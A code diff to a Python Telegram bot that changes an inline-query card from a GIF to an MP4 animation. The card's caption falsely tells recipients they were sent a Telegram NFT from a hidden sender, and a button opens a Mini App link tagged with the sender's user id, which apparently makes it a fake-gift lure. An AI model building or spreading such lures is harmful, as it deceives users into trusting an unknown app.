@@ -1,6 +1,6 @@
 import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, WebAppInfo, InlineQueryResultGif
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, WebAppInfo, InlineQueryResultGif, InlineQueryResultMpeg4Gif
 from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
 from dotenv import load_dotenv
 
@@ -61,14 +61,15 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode='Markdown')
 
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обрабатывает inline запросы - показывает красивую карточку с GIF"""
+    """Обрабатывает inline запросы - показывает красивую карточку с видео (высокое качество)"""
     user_id = update.inline_query.from_user.id
 
     # Ссылка на Mini App
     mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
     nft_name = "Lol Pop #130400"
-    gif_url = "https://www.image2url.com/r2/default/gifs/1786959529975-a05f7ff9-5af1-4c89-9b54-fd62ca60db66.gif"
+    video_url = "https://www.image2url.com/r2/default/videos/1786960676045-7ceade89-2395-41a1-8019-e7f1890a0003.mp4"
+    thumbnail = "https://i.imgur.com/placeholder.jpg"
 
     # Создаём красивую карточку с кнопкой
     keyboard = [
@@ -76,17 +77,14 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    # Используем InlineQueryResultGif чтобы показать GIF с текстом
-    # Увеличиваем размер для лучшего качества в Telegram
-    thumbnail = "https://i.imgur.com/placeholder.jpg"
-
+    # Используем InlineQueryResultMpeg4Gif для лучшего качества
     results = [
-        InlineQueryResultGif(
+        InlineQueryResultMpeg4Gif(
             id="nft_gift",
-            gif_url=gif_url,
+            mpeg4_url=video_url,
             thumbnail_url=thumbnail,
-            gif_width=480,
-            gif_height=738,
+            mpeg4_width=480,
+            mpeg4_height=738,
             title="Отправить Telegram NFT",
             caption=f"Вам отправлен Telegram NFT: **{nft_name}**\n\nОтправитель: Аккаунт скрыт",
             parse_mode='Markdown',
